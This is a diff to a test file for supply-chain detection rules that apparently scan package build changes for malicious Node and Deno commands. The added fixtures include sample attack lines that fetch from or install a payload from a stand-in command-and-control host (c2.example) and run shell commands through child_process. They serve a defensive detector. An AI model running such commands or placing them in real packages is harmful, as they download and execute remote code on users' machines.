@@ -25,6 +25,21 @@ describe('campaign rules', () => {
     expect(ruleById(CAMPAIGN_RULES, 'NPM-001').check(pkgbuild)).not.toBeNull();
     expect(ruleById(CAMPAIGN_RULES, 'NPM-001').check(install)).not.toBeNull();
     expect(ruleById(CAMPAIGN_RULES, 'NPM-001').check(script)).toBeNull();
+
+    for (const id of ['CAUR-NODE-EVAL', 'CAUR-NODE-CHILD-PROCESS', 'CAUR-DENO-FETCH']) {
+      expect(ruleById(CAMPAIGN_RULES, id).check(script)).toBeNull();
+      expect(ruleById(CAMPAIGN_RULES, id).check(pkgbuild)).toBeNull();
+    }
+  });
+
+  it.each([
+    ['CAUR-NODE-EVAL', "node -e \"require('http').get('http://c2.example')\""],
+    ['CAUR-NODE-EVAL', 'node --eval payload.js'],
+    ['CAUR-NODE-CHILD-PROCESS', 'node -e "require(\'child_process\').execSync(curl)"'],
+    ['CAUR-NODE-CHILD-PROCESS', 'const { execSync } = require("child_process");'],
+    ['CAUR-DENO-FETCH', 'deno install -n x https://c2.example/payload.ts'],
+  ])('flags %s for %j', (id, line) => {
+    expect(ruleById(CAMPAIGN_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
   });
 
   it('does not flag unrelated npm usage', () => {
